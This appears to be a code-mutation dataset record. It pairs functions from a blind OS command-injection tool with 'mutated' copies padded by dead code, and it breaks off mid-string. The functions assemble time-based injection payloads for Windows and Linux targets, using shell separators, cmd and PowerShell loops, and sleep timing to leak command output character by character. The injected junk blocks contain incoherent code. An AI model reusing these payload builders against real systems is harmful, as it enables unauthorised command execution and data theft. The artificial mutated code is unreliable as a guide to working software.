settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload"
        ]
    },
    {
        "func_name": "cmd_execution_alter_shell",
        "original": "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do \" + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c 